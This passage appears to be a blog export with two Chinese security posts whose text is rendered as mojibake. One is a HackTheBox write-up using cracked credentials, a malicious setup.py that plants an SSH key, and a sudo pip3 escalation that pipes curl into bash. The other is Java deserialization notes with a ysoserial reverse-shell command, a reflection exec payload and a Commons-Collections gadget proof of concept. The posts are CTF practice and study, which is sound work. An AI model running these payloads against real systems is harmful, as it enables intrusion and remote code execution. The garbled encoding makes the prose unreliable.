developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C.ç¬¬äºŒä¸ªé‚®ä»¶æ³„éœ²äº†ä¸€ä¸ªç”¨æˆ·ã€‚çœ‹èµ·æ¥å¯ä»¥ç»§ç»­è¿›è¡Œè´¦æˆ·å¯†ç çš„å°è¯•äº†ã€‚ æœä¸å…¶ç„¶è¿˜æ˜¯æ²¡æœ‰å¾—åˆ°sshçš„è´¦æˆ·ã€‚ä½†æ˜¯developerå¯ä»¥ç™»é™†ftpã€‚çœ‹äº†ä¸‹å‘ç°é‡Œé¢æ˜¯ä¸ªdevæ–‡ä»¶å¤¹ã€‚å†…å®¹è·Ÿæˆ‘ä»¬80ç«¯å£çš„ç½‘é¡µä¸€è‡´ã€‚å…ˆæŠŠdevæ–‡ä»¶å¤¹æ‹–ä¸‹æ¥ã€‚ 1wget ftp://10.10.10.197:21/* --ftp-user=developer --ftp-password=m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C -r ä»”ç»†ä¸€å®¡å‘ç°éƒ½æ˜¯é™æ€æ–‡ä»¶ã€‚è¿™ç‚¹æœ‰ç‚¹æ‡µã€‚ä¸è¿‡æ–‡ä»¶å¤¹åå­—å€’æ˜¯æé†’äº†æˆ‘ä¸€ä¸ªç–å¿½çš„åœ°æ–¹ã€‚é‚£å°±æ˜¯æˆ‘å¿˜è®°æ”¶é›†å­åŸŸåäº†ã€‚äºæ˜¯wfuzzèµ°èµ·æ”¶é›†å­åŸŸåã€‚å‘ç°ç¡®å®å­˜åœ¨dev.sneakycorp.htb æ—¢ç„¶æˆ‘ä»¬çš„ftpç›®å½•æ˜¯å¯¹åº”çš„webç›®å½•ã€‚é‚£å°±ç›´æ¥mputä¸Šä¼ webshellå³å¯ã€‚å‘½ä»¤æ‰§è¡Œgetshell. å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†æ€»ä½“ä¸Šåªæœ‰enumçš„å†…å®¹ã€‚ä¸è¿‡æ•´ä½“ä¸Šæ”¶è·æŒºå¤§çš„ã€‚å› ä¸ºä»¥å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡smtp.ç°åœ¨å€Ÿæ­¤æœºä¼šæ¥è§¦smtp,imapç†Ÿæ‚‰äº†ç›¸å¯¹åº”çš„å‘½ä»¤å€’æ˜¯æŒºä¸é”™çš„ã€‚ privesc to user æ¥ä¸‹æ¥æ˜¯ææƒéƒ¨åˆ†ã€‚è¿™é‡Œæˆ‘é‡ç‚¹å…³æ³¨pypiè·Ÿlow.å› ä¸ºè¿™ä¸¤ä¸ªç”¨æˆ·åœ¨å‰é˜¶æ®µå‡ºç°çš„é¢‘ç‡æ¯”è¾ƒé«˜ã€‚ é¦–å…ˆå¾ˆå®¹æ˜“å‘ç°/var/wwwæœ‰å››ä¸ªæ–‡ä»¶å¤¹dev.sneakymailer.htb,pypi.sneakymailer.htb,sneakymailer.htbè·Ÿhtml.å…¶ä¸­devè·Ÿhtmlå†…å®¹ä¸€è‡´æˆ‘ä»¬ä¸ç”¨ç®¡ã€‚è¿™é‡Œpypi.sneakymailer.htbå€’æ˜¯ä¸ªæŒºéš¾çˆ†å‡ºæ¥çš„å­åŸŸåã€‚é‚£ä¹ˆå…ˆåŠ åˆ°hostsé‡Œå»ã€‚å‘ç°å¯¹åº”çš„åŸæ¥å°±æ˜¯ä¹‹å‰çš„8080ç«¯å£çš„æœåŠ¡ã€‚ç½‘é¡µå†…å®¹æ˜¯ä¸ªpypiserver 1.3.2.ç„¶åæœ‰ä¸¤ä¸ªå†…å®¹éƒ½è¦å¯†ç ã€‚ çœ‹èµ·æ¥webé¡µé¢æ²¡å•¥ç”¨ã€‚ç›´æ¥å»pypiæ–‡ä»¶å¤¹ä¸‹æ‰¾å†…å®¹ã€‚å‘ç°ä¸€ä¸ª.htpasswd 1pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F; æŸ¥çœ‹hash-exampleså‘ç°æ˜¯apache apr hash.hashcatç ´è§£ä¹‹ã€‚ 1hashcat -m 1600 -a 0 --force -o pass.txt hash.txt /usr/share/wordlists/rockyou.txt å¾—åˆ°$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaouiç°åœ¨æˆ‘ä»¬å€’æ˜¯èƒ½ç”¨è¿™ç»„è´¦æˆ·ç™»å½•8080çš„pypiserverã€‚ä½†æ˜¯ä¼¼ä¹è¿˜æ˜¯æ²¡å•¥ç”¨ã€‚çœ‹æ¥æˆ‘ä»¬å¾—å»äº†è§£ä¸‹pypiserver ä½œç”¨https://pypi.org/project/pypiserver/#table-of-contentsè¿™é‡Œé¢ Uploading Packages Remotely è¿™ä¸ªåŠŸèƒ½æ¯”è¾ƒå¸å¼•çœ¼çƒã€‚å‡å¦‚æˆ‘ä»¬èƒ½ä¸Šä¼ æ¶æ„packageã€‚åº”è¯¥å°±èƒ½æ‰§è¡Œå‘½ä»¤äº†ã€‚è·‘ä¸ªlinpeas.sh.çœ‹çœ‹ 12pypi 691 0.1 0.6 36800 25764 ? Ss 04:06 0:01 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packageslow 1098 0.1 0.5 29952 20976 ? Ss 04:07 0:00 /home/low/venv/bin/python /opt/scripts/low/install-modules.py çœ‹èµ·æ¥lowç”¨æˆ·çš„ç¡®åœ¨æ‰§è¡Œpython modulesçš„ä¸‹è½½ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•æ„å»ºä¸€ä¸ªæ¶æ„çš„setup.pyã€‚ç½‘ä¸Šæ‰¾ä¸ªdemo.å‡†å¤‡ä¸€ä¸ªå†™å…¬é’¥çš„payloadã€‚ 123456789101112131415161718192021222324import setuptoolstry: with open(\"/home/low/.ssh/authorized_keys\", \"a\") as f: f.write(\"\"\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD1J7hVPxdMEhfE1XL2OOPjgQvKZGm68ldluK8TTW70AVRKxwvfUzOCJA4vPFgrzeJ5E27UTYatqxtxIDagHHjMtmkt+FFk62Xe8qO4pDlzQEjrSiXA/Ex82KHqlnDReaRHEEcc4CmtvzBVavB4o34CeTUYEG2N7OC1RbVUZkX9ULjodiaasubHG4lo5M2wYZ+1RjPxl/wupsEmPzB/SoSUgCAMra/tsd1jxhsJ0+m45puGKgv5Zb4IeWMATdd+Ea6v7J70YUns1E7Ciutn83jRw4efId4ZNJDGCA0GYKqaYLKsj/gA+evl/6asj8TQBgD516xFp2bpdGWuzy0sef2c22E6xS9Vs/uUpwC5T8hMlvjxtFIJE57dQz6JrJdwqQk1Jf3WQUoU6NfcRTampYVdrTHAatLccghgAS8ldA0vxO7hTzSDocO6iTfDqPrfRQfk7F0/geEP7KgoWKAJvBz1RQpmTvvhWa6lbESafIjzPPfN0e2I17CPSir/ek5fZh0= root@byc404\"\"\") f.close()except Exception as e: passsetuptools.setup( name=\"byc_404\", version=\"0.0.1\", author=\"byc\", author_email=\"byc@bycsec.top\", description=\"A small example package\", long_description=\"\", long_description_content_type=\"\", url=\"https://github.com/pypa/sampleproject\", packages=setuptools.find_packages(), classifiers=[ \"Programming Language :: Python :: 3\", \"License :: OSI Approved :: MIT License\", \"Operating System :: OS Independent\", ],) ç„¶åæ˜¯~/.pypircæ–‡ä»¶ã€‚ä½¿ç”¨å®ƒæœ‰ä»¥ä¸‹ä¸¤ä¸ªä¼˜åŠ¿ It removes the need to enter a username/password when pushing to PyPI. 2. It simplifies command line usage when pushing packages to a non-default package repository (i.e. anywhere other than pypi.org). è¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨é‡å¤è¾“å…¥ç”¨æˆ·å¯†ç ã€‚åŒæ—¶ä¿è¯å†…å®¹æ¨å‘sneakycorp.htbæ‰€åœ¨çš„pypiä»“åº“ã€‚æŒ‰ç…§å®˜ç½‘è®¾å®šä¿®æ”¹ä¸‹ 1234567[distutils]index-servers &#x3D; local[local]repository: http:&#x2F;&#x2F;pypi.sneakycorp.htb:8080&#x2F;username: pypipassword: soufianeelhaoui å…ˆchmod 600 .pypirc ç„¶åå†æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥upload packageã€‚ 1python setup.py sdist register -r local upload -r local è™½ç„¶ä¼šæç¤ºè¿™ç§æ“ä½œæ–¹æ³•å·²ç»deprecatedäº†ã€‚ä½†æ˜¯ä¸å½±å“å®Œæˆå‘½ä»¤ã€‚å½“ç„¶è¿™æ ·ä½¿ç”¨æ˜¯å› ä¸ºé¶æœºæ²¡å®‰è£…twine.ä¸è¿‡åŸºäºpypiserveræ˜¯æš´éœ²åœ¨å…¬ç½‘çš„ã€‚æˆ‘ä»¬ç›´æ¥æœ¬åœ°ä½¿ç”¨twineä¹Ÿå¯ä»¥ã€‚ 123python3 setup.py sdist bdist_wheelpython3 -m twine upload â€“repository local dist/* å†™å…¥å…¬é’¥å³å¯sshç™»å½•æ”¶ä¸‹user.txt. è¿™ä¸€éƒ¨åˆ†pypiserverçš„ä½¿ç”¨æŒºæœ‰æ„æ€çš„ã€‚ä¸è¿‡æˆ‘è¿™é‡Œè¯•äº†ä¸å†™å…¬é’¥ç›´æ¥å‘½ä»¤æ‰§è¡Œå€’æ˜¯æ²¡æœ‰ç”¨,æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜ï¼ˆä¹Ÿè®¸æ˜¯å› ä¸ºé¶æœºåŠ¨ä¸åŠ¨é‡å¯å§ï¼Œæ¯•ç«Ÿåˆšå‡ºçš„é¶æœºæ€»æ˜¯å®¹æ˜“å¡ï¼‰ privesc to rootè¿™ä¸€éƒ¨åˆ†å€’æ˜¯è¿‡äºç®€å•äº†ã€‚ç”±äºå‰é¢æœç´¢èµ„æ–™æ—¶æœåˆ°äº†pipçš„privesc.æ‰€ä»¥æ‰§è¡Œsudo -lå‘ç°å¯ä»¥pip3åå°±ç®€å•äº†https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/ 123TF=$(mktemp -d)echo \"import os;os.system('curl 10.10.14.87|bash')\" &gt; $TF/setup.pysudo pip3 install $TF rooted. summaryæ•´ä½“ä¸Šæ¥è¯´rootä¹‹å‰çš„éƒ¨åˆ†éƒ½ç®—æ˜¯æ–°çŸ¥è¯†ã€‚é‚®ä»¶çš„éƒ¨åˆ†æŒºæœ‰æ„æ€çš„ã€‚æ„Ÿè§‰éå¸¸æ¥è¿‘çœŸå®å®æˆ˜ã€‚å‡å¦‚çœŸçš„æœ‰ç”¨æˆ·å®‰å…¨æ„è¯†ä¸å¼ºç‚¹å‡»äº†æˆ‘ä»¬çš„é“¾æ¥å°±å¯ä»¥æ‰“å¼€å¦ä¸€ç‰‡å¤©åœ°äº†ã€‚åé¢pythonçš„éƒ¨åˆ†å¯èƒ½æœ‰ç‚¹æŠ€ç©·äº†ã€‚ä¸è¿‡ç¡®å®ç®—æ˜¯pythonç”¨äºææƒçš„å¸¸è§æ‰‹æ®µã€‚æ¶æ„åŒ…æˆ–è€…æ¶æ„pyæºç éƒ½å¯ä»¥å¯¼è‡´ææƒå‘ç”Ÿã€‚","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"å­¦ä¹ ç¬”è®°-Javaç›¸å…³","slug":"å­¦ä¹ ç¬”è®°-Javaç›¸å…³","date":"2020-07-09T03:04:44.000Z","updated":"2021-02-18T05:08:44.717Z","comments":true,"path":"2020/07/09/å­¦ä¹ ç¬”è®°-Javaç›¸å…³/","link":"","permalink":"https://www.bycsec.top/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/","excerpt":"ä»å‡ ä¸ªæœˆå‰å°±è¯´è¦å­¦javawebã€‚ç»“æœä¸€ç›´åœ¨æ‹–ã€‚ç°åœ¨å¼€ç¯‡æ–‡ç« å¼ºè¿«è‡ªå·±å†™å†™ç¬”è®°ã€‚ å¤§ä½“ä¸Šæ‰“ç®—ä»å¸¸è§æ¼æ´å’Œæ¡†æ¶ä½¿ç”¨ä¸¤ä¸ªæ–¹é¢å­¦ä¹ ã€‚å› ä¸ºæœ‰è¯­è¨€åŸºç¡€å°±ä¸è°ˆæ¯”è¾ƒåŸºç¡€çš„éƒ¨åˆ†äº†ã€‚","text":"ä»å‡ ä¸ªæœˆå‰å°±è¯´è¦å­¦javawebã€‚ç»“æœä¸€ç›´åœ¨æ‹–ã€‚ç°åœ¨å¼€ç¯‡æ–‡ç« å¼ºè¿«è‡ªå·±å†™å†™ç¬”è®°ã€‚ å¤§ä½“ä¸Šæ‰“ç®—ä»å¸¸è§æ¼æ´å’Œæ¡†æ¶ä½¿ç”¨ä¸¤ä¸ªæ–¹é¢å­¦ä¹ ã€‚å› ä¸ºæœ‰è¯­è¨€åŸºç¡€å°±ä¸è°ˆæ¯”è¾ƒåŸºç¡€çš„éƒ¨åˆ†äº†ã€‚ vulnsjavaæ¯”è¾ƒå¸¸è§çš„æœ‰ç‰¹è‰²çš„æ¼æ´åŒ…æ‹¬ä½†ä¸é™äº deserialization xxe SpEL ssti url bypassâ€¦â€¦ è¿™é‡Œç”¨JoyChouå¤§ä½¬çš„é¡¹ç›®å­¦ä¹  https://github.com/JoyChou93/java-sec-codeéå¸¸å…¨é¢ã€‚ æ¯ç§æ¼æ´éƒ½æœ‰å¯¹åº”çš„æºç ã€‚åŸå…ˆå¾ˆå¤šååºåˆ—çš„æ´å¤ç°è¿‡ä½†æ˜¯æ²¡æœ‰çœ‹è¿‡æºç ã€‚è¿™é‡Œæ­£å¥½ç ”ç©¶ä¸‹ã€‚ deserializationæ¶æ„åŠé˜²èŒƒæºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package org.joychou.controller;import org.joychou.config.Constants;import org.joychou.security.AntObjectInputStream;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletRequest;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.InvalidClassException;import java.io.ObjectInputStream;import java.util.Base64;import static org.springframework.web.util.WebUtils.getCookie;/** * Deserialize RCE using Commons-Collections gadget. * * @author JoyChou @2018-06-14 */@RestController@RequestMapping(\"/deserialize\")public class Deserialize &#123; protected final Logger logger = LoggerFactory.getLogger(this.getClass()); /** * java -jar ysoserial.jar CommonsCollections5 \"open -a Calculator\" | base64 * Add the result to rememberMe cookie. * &lt;p&gt; * http://localhost:8080/deserialize/rememberMe/vuln */ @RequestMapping(\"/rememberMe/vuln\") public String rememberMeVul(HttpServletRequest request) throws IOException, ClassNotFoundException &#123; Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) &#123; return \"No rememberMe cookie. Right?\"; &#125; String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); ObjectInputStream in = new ObjectInputStream(bytes); in.readObject(); in.close(); return \"Are u ok?\"; &#125; /** * Check deserialize class using black list. * &lt;p&gt; * http://localhost:8080/deserialize/rememberMe/security */ @RequestMapping(\"/rememberMe/security\") public String rememberMeBlackClassCheck(HttpServletRequest request) throws IOException, ClassNotFoundException &#123; Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) &#123; return \"No rememberMe cookie. Right?\"; &#125; String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); try &#123; AntObjectInputStream in = new AntObjectInputStream(bytes); // throw InvalidClassException in.readObject(); in.close(); &#125; catch (InvalidClassException e) &#123; logger.info(e.toString()); return e.toString(); &#125; return \"I'm very OK.\"; &#125;&#125; è¿™é‡Œåº”è¯¥æ˜¯æ¨¡ä»¿shiroçš„rememberMecookieååºåˆ—åŒ–.ä¸‹é¢å…ˆæ¥å›é¡¾ä¸‹javaçš„åºåˆ—åŒ–çŸ¥è¯† https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/ about Java æä¾›äº†ä¸€ç§å¯¹è±¡åºåˆ—åŒ–çš„æœºåˆ¶ï¼šä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¯¥å­—èŠ‚åºåˆ—åŒ…æ‹¬è¯¥å¯¹è±¡çš„æ•°æ®ã€æœ‰å…³å¯¹è±¡çš„ç±»å‹çš„ä¿¡æ¯å’Œå­˜å‚¨åœ¨å¯¹è±¡ä¸­æ•°æ®çš„ç±»å‹ã€‚å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å‡ºæ¥ï¼Œå¹¶ä¸”å¯¹å®ƒè¿›è¡Œååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€å¯¹è±¡çš„æ•°æ®ï¼Œè¿˜æœ‰å¯¹è±¡ä¸­çš„æ•°æ®ç±»å‹å¯ä»¥ç”¨æ¥åœ¨å†…å­˜ä¸­æ–°å»ºå¯¹è±¡ã€‚æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯JVMç‹¬ç«‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªå¹³å°ä¸Šåºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥åœ¨å¦ä¸€ä¸ªå®Œå…¨ä¸åŒçš„å¹³å°ä¸Šååºåˆ—åŒ–è¯¥å¯¹è±¡ã€‚ usage 1.å¼¥è¡¥æ“ä½œç³»ç»Ÿçš„å·®å¼‚2.å‘è¿œç¨‹å¯¹è±¡å‘é€ä¿¡æ¯æ—¶ï¼Œéœ€è¦é€šè¿‡å¯¹è±¡åºåˆ—åŒ–æ¥ä¼ è¾“å‚æ•°å’Œè¿”å›å€¼3.ä½¿ç”¨ä¸€ä¸ªBeanæ—¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨è®¾è®¡é˜¶æ®µå¯¹å®ƒçš„çŠ¶æ€ä¿¡æ¯è¿›è¡Œé…ç½®ï¼Œç„¶è€Œè¿™ç§çŠ¶æ€ä¿¡æ¯éœ€è¦ä¿å­˜ä¸‹æ¥ï¼Œå¹¶åœ¨ç¨‹åºå¯åŠ¨æ—¶è¿›è¡ŒåæœŸæ¢å¤ï¼Œè¿™æ—¶æ˜¯é ååºåˆ—åŒ–æœºåˆ¶æ¥å®Œæˆçš„4.æ–¹ä¾¿ä¿å­˜å¯¹è±¡ä¿¡æ¯ä»¥ä¾¿äºä¸‹æ¬¡JVMå¯åŠ¨æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ dependencies 1.å®ç° java.io.Serializable å¯¹è±¡2.è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç»ƒæ‰‹çš„ä¾‹å­ã€‚Userç±» 123456789import java.io.*;public class User implements Serializable &#123; public String name; public int num; public void info()&#123; System.out.println(\"name : \"+name+\"\\nnum : \"+num); &#125;&#125; testç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.io.*;public class test &#123; public static void serialize_test()&#123; User user=new User(); user.name=\"byc_404\"; user.num=404; user.info(); try &#123; FileOutputStream f= new FileOutputStream(\"user.ser\"); ObjectOutputStream o =new ObjectOutputStream(f); o.writeObject(user); o.close(); f.close(); System.out.println(\"[*]serialize done.\"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user=null; try &#123; FileInputStream f= new FileInputStream(\"user.ser\"); ObjectInputStream o =new ObjectInputStream(f); user=(User)o.readObject(); o.close(); f.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; System.out.println(\"[*]unserialize done.\"); user.info(); &#125; public static void main(String[] args) &#123; unserialize_test(); &#125;&#125; é¦–å…ˆæ³¨æ„ä¸Šé¢çš„è¯­å¥ç›´æ¥è°ƒç”¨è¯»å†™æ–‡ä»¶æ—¶éƒ½éœ€è¦å®ç°trycatchã€‚è€Œreadobjectæ—¶ç‰¹æ®Šçš„æ·»åŠ äº†ä¸€ä¸ªClassNotFound çš„å¼‚å¸¸ã€‚åœ¨ideaä¸­å†™å¥½åŸä»£ç åctrl+alt+tæ·»åŠ ä¼šè‡ªåŠ¨è€ƒè™‘åˆ°è¿™äº›é—®é¢˜ï¼Œç”Ÿæˆçš„user.serçš„æ•°æ® å¼€å¤´AC ED è¡¨ç¤ºæ”¯æŒåºåˆ—åŒ–åè®®ã€‚00 05 åˆ™æ˜¯åºåˆ—åŒ–ç‰ˆæœ¬ã€‚è¿™æ˜¯åºåˆ—åŒ–æ•°æ®æ¯”è¾ƒæ˜¾è‘—çš„ç‰¹å¾ã€‚ ç”±äºç¼–ç¨‹ä¸­çš„é€‰æ‹©åŸå› ï¼Œæœ‰æ—¶éœ€è¦æˆ‘ä»¬å®ç°éé»˜è®¤çš„åºåˆ—åŒ–è¿‡ç¨‹ã€‚æ­¤æ—¶å¯ä»¥åœ¨å®ç°äº†Serializableæ¥å£çš„å‰æä¸‹æ·»åŠ ä¸¤ä¸ªæ–¹æ³• 123private void writeObject(ObjectOutputStream stream) throws IOExceptionprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException åœ¨è°ƒç”¨ObjectOutputStream.writeObject()æ—¶ï¼Œä¼šæ£€æŸ¥æ‰€ä¼ é€’çš„Serializableå¯¹è±¡ï¼Œçœ‹çœ‹æ˜¯å¦å®ç°äº†è‡ªå·±çš„writeObject()ï¼Œè‹¥å®ç°äº†ï¼Œåˆ™è·³è¿‡æ­£å¸¸çš„åºåˆ—åŒ–è¿‡ç¨‹å¹¶è°ƒç”¨è‡ªå·±å®ç°çš„writeObject()ã€‚readObject()æ–¹æ³•åŒç† é‚£ä¹ˆå›åˆ°è¿œç¨‹ã€‚è¿™é‡Œç›´æ¥æ‰“ä¸€å‘å¼¹shellçš„payloadã€‚å»jacksonç›´æ¥è½¬æ¢ä¸‹ç¼–ç  1java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjcuMjQ2LjIwMi85MDAxIDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | base64 è¿™ç¯å¢ƒè²Œä¼¼æ˜¯åªæœ‰cc5çš„gadgetèƒ½ç”¨.åæ¥åœ¨åŸä½œè€…é‚£çœ‹åˆ°åº”è¯¥æ˜¯å¼•å…¥äº†apache-commons-collections 3.1.jar CommonCollections å®¡è®¡ ä¸‹é¢æ­£å¥½æ¥å®¡è®¡ä¸‹Commons-Collectionsè¿™ä¸ªåŒ…ã€‚https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1 åœ¨è¿™ä¸‹å¥½jaråŒ…åæŠŠå®ƒåŠ è¿›library.å°±å¯ä»¥çœ‹æºç äº†ã€‚æ¼æ´ä»£ç å‡ºç°åœ¨è¿™ä¸€éƒ¨åˆ†ã€‚ TransformedMapç±»æ˜¯å®ç°äº†serializable,å¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapæ¥å£çš„ä¸€ä¸ªæ‰©å±•TransformedMap.decorate()æ–¹æ³•ï¼Œå¯ä»¥è·å¾—ä¸€ä¸ªTransformedMapçš„å®ä¾‹åŒ–çš„å¯¹è±¡ã€‚ TransformedMap.decorate()æ–¹æ³•èƒ½å°†æ™®é€šçš„MapAè½¬æ¢ä¸ºTransformedMapBï¼ŒåŒæ—¶å¦‚æœTransformedMap.decorate()æ–¹æ³•è®¾ç½®äº†ç¬¬äºŒä¸ªå‚æ•°keyTransformeræˆ–è€…ç¬¬ä¸‰ä¸ªå‚æ•°valueTransformerï¼Œå½“TransformedMapBè°ƒç”¨Mapçš„putæ–¹æ³•æˆ–è€…Map.Entryçš„setValueæ–¹æ³•å°±ä¼šè‡ªåŠ¨è§¦å‘åˆšæ‰è®¾ç½®çš„keyTransformeræˆ–è€…valueTransformerç›¸åº”çš„Transformer Map.putä¸Map.Entryå…¶å®å°±æ˜¯Mapçš„ä¸¤ä¸ªæ¯”è¾ƒå¸¸è§çš„æ¥å£ã€‚å‰è€…å¯ä»¥å¾€mapä¸­è®¾ç½®ä¸€å¯¹é”®å€¼ã€‚åè€…åˆ™æ˜¯å®šä¹‰äº†getKey(),getValue()ï¼ŒsetKey(),setValue()ç­‰æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¿®æ”¹é”®å€¼ã€‚ ç‰›é€¼çš„æ˜¯è¿™ä¸ªTransformerå¯ä»¥åˆ©ç”¨æ•°ç»„æ„é€ æˆChainedTransformerï¼ŒChainedTransformeræœ€ååˆ©ç”¨Javaçš„åå°„æœºåˆ¶å‘½ä»¤æ‰§è¡Œã€‚ å…³äºåå°„å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ªç®—æ˜¯javaéå¸¸å¸¸è§çš„å‘½ä»¤æŠ€å·§äº†ã€‚åœ¨SpELè·ŸSpring çš„sstiä¸­ç»å¸¸è§åˆ°ã€‚ä¸»è¦ç›®çš„å°±æ˜¯ç»•è¿‡æ²™ç›’ã€‚å½“ç„¶å¦‚phpçš„åºåˆ—åŒ–ä¸­ä¹Ÿæ›¾ç»é‡åˆ°è¿‡.è¿™ç®—æ˜¯JavaåŠ¨æ€ç‰¹æ€§çš„ä½“ç°ã€‚ ä¸€ä¸ªå¼¹è®¡ç®—å™¨çš„åå°„payload 1234567891011121314151617181920import java.lang.reflect.Method;public class reflect &#123; public static void main(String[] args) throws Exception &#123; Object input = Runtime.class; Class cls = input.getClass(); Method method = cls.getMethod(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;); input = method.invoke(input, new Object[] &#123; \"getRuntime\", new Class[0] &#125;); // æ­¤æ—¶clsä¸ºMethodï¼Œå¯¹åº”getRuntimeæ–¹æ³•ï¼Œè·å–invokeæ–¹æ³•å¹¶æ‰§è¡Œ cls = input.getClass(); method = cls.getMethod(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;); input = method.invoke(input, new Object[] &#123; null, new Object[0] &#125;); // æ­¤æ—¶clsä¸ºRuntimeï¼Œå¯¹åº”Runtime.getRuntime()çš„ç»“æœï¼Œå¯è°ƒç”¨execæ–¹æ³• cls = input.getClass(); method = cls.getMethod(\"exec\", new Class[] &#123; String.class &#125;); input = method.invoke(input, new Object[] &#123; \"calc\" &#125;); &#125;&#125; ä¸‹é¢æ¥è·Ÿç€JoyChouå¸ˆå‚…çš„åšæ–‡çœ‹çœ‹Map.putæ˜¯æ€ä¹ˆé€šè¿‡æ„é€ è¾¾æˆå‘½ä»¤æ‰§è¡Œçš„ã€‚ 12345678910111213141516171819202122232425262728import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class poc1 &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(\"name\", \"byc_404\"); Map outmap = TransformedMap.decorate(innermap, transformerChain, null); outmap.put(\"quote\",\"23333\"); &#125;&#125; åœ¨put()æ–¹æ³•é‚£ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€‚ç¬¬ä¸€æ­¥æ˜¯è°ƒç”¨TransformedMap.put()æ–¹æ³•ç„¶åè¿›è¡Œä¸€ä¸ªkeyTransformeræ˜¯å¦ä¸ºç©ºçš„åˆ¤æ–­ã€‚æˆ‘ä»¬å› ä¸ºè®¾ç½®äº†ChainedTransformerä½œä¸ºkeyTransformer,å› 